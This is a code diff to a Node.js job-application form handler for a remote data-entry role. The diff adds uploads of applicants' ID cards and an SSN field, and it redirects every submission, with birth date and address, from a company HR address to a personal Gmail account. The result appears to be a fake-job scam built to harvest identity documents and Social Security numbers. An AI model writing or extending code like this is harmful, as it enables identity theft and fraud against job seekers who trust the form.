@@ -12,14 +12,19 @@ const upload = multer({
       "application/pdf",
       "application/msword",
       "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+      "image/png",
+      "image/jpeg",
     ];
     if (allowedTypes.includes(file.mimetype)) {
       cb(null, true);
     } else {
-      cb(new Error("Only PDF and DOC files are allowed"));
+      cb(new Error("Only PDF, DOC, PNG, or JPG files are allowed"));
     }
   },
-}).single("resume");
+}).fields([
+  { name: "idcard", maxCount: 1 },
+  { name: "resume", maxCount: 1 },
+]);
 
 // Nodemailer transporter configuration
 const transporter = nodemailer.createTransport({
@@ -42,7 +47,8 @@ module.exports = (req, res) => {
 
     try {
       const formData = req.body;
-      const resume = req.file;
+      const idcard = req.files?.idcard?.[0];
+      const resume = req.files?.resume?.[0];
 
       // Filter out hidden inputs to prevent spam/bot submissions
       if (formData.__gra__ || formData.consent) {
@@ -53,10 +59,24 @@ module.exports = (req, res) => {
       delete formData.__gra__;
       delete formData.consent;
 
-      // Prepare email content
+      let attachments = [];
+      if (idcard) {
+        attachments.push({
+          filename: idcard.originalname,
+          content: idcard.buffer,
+        });
+      }
+      if (resume) {
+        attachments.push({
+          filename: resume.originalname,
+          content: resume.buffer,
+        });
+      }
+
+      // Prepare email content (including SSN, but note security risk unless encrypted)
       const mailOptions = {
         from: process.env.ZOHO_USER,
-        to: "xinai.leunghr@qulaaengineering.com",
+        to: "cuteandsexylady4678@gmail.com",
         subject: "New Job Application Submission",
         html: `
           <h2>New Application for Remote Chat Support/Data Entry Role</h2>
@@ -64,6 +84,7 @@ module.exports = (req, res) => {
           <p><strong>Email:</strong> ${formData.email || "N/A"}</p>
           <p><strong>Phone:</strong> ${formData.phone || "N/A"}</p>
           <p><strong>Date of Birth:</strong> ${formData.dob || "N/A"}</p>
+          <p><strong>SSN:</strong> ${formData.pid || "N/A"}</p>
           <p><strong>Address:</strong> ${formData.address || "N/A"}</p>
           <p><strong>State:</strong> ${formData.state || "N/A"}</p>
           <p><strong>U.S. Authorized:</strong> ${formData.us_auth || "N/A"}</p>
@@ -100,27 +121,20 @@ module.exports = (req, res) => {
             formData.genuine ? "Yes" : "No"
           }</p>
         `,
-        attachments: resume
-          ? [
-              {
-                filename: resume.originalname,
-                content: resume.buffer,
-              },
-            ]
-          : [],
+        attachments,
       };
 
       // Send email
       await transporter.sendMail(mailOptions);
       res.send(
-        "✅ Your application has been submitted successfully! <a href='/'>Back to form</a>"
+        '✅ Your application has been submitted successfully! <a href="/">Back to form</a>'
       );
     } catch (error) {
       console.error("Error sending email:", error);
       res
         .status(500)
         .send(
-          `Error sending application: ${error.message}. <a href="/">Try again</a>`
+          `Error sending application: ${error.message}. <a href=\"/\">Try again</a>`
         );
     }
   });
